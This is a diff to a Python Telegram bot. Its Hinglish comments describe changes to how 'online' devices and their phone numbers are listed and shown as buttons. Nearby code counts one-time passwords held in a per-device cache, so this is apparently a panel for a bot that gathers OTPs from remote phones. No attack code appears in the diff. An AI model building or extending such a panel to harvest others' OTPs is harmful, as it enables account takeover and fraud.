@@ -673,7 +673,7 @@ def count_otps() -> int:
     return sum(len(ol) for om in otp_cache.values() for ol in om.values())
 
 # ══════════════════════════════════════════════════════════════════════════════
-# ✅ FIXED all_online() — Duplicate aur No Number Hata Diya
+# ✅ FIXED all_online() — Duplicate hataye, par "No Number" wapas laaye
 # ══════════════════════════════════════════════════════════════════════════════
 def all_online() -> list:
     res = []
@@ -683,10 +683,16 @@ def all_online() -> list:
         for did, info in dm.items():
             if info.get("online"):
                 ph = info.get("phone") or "—"
-                # Agar number nahi hai ya pehle se list mein hai toh skip karo
-                if ph == "—" or not ph.strip() or ph in seen_numbers:
+                
+                # Number nahi hai toh unique ID banake rakho taaki list se na hatae
+                if ph == "—" or not ph.strip():
+                    ph_key = f"no_num_{did}" 
+                else:
+                    ph_key = ph
+                    
+                if ph_key in seen_numbers:
                     continue
-                seen_numbers.add(ph)
+                seen_numbers.add(ph_key)
                 res.append((lb, did, info))
     return res
 
@@ -821,7 +827,7 @@ def kb_back(page: str = "main_menu") -> InlineKeyboardMarkup:
     ]])
 
 # ══════════════════════════════════════════════════════════════════════════════
-# ✅ FIXED kb_online() — Neela dabba waisa hi, sirf number
+# ✅ FIXED kb_online() — Neela dabba waisa hi, "No Number" wapas aayega
 # ══════════════════════════════════════════════════════════════════════════════
 def kb_online(devices: list, page: int) -> InlineKeyboardMarkup:
     start = page * DEVICES_PER_PAGE
@@ -834,8 +840,9 @@ def kb_online(devices: list, page: int) -> InlineKeyboardMarkup:
             ph = info.get("phone") or "—"
             esc  = lb.replace(":","_")
             
-            # Neela dabba (🟢) waisa hi hai
-            row.append(InlineKeyboardButton(f"🟢 {ph}", callback_data=f"dev:{esc}:{did}:{page}"))
+            # Neela dabba (🟢) waisa hi hai, number nahi toh "No Number"
+            display_num = ph if (ph and ph != "—") else "No Number"
+            row.append(InlineKeyboardButton(f"🟢 {display_num}", callback_data=f"dev:{esc}:{did}:{page}"))
         rows.append(row)
         
     nav, total = [], max(1,(len(devices)+DEVICES_PER_PAGE-1)//DEVICES_PER_PAGE)
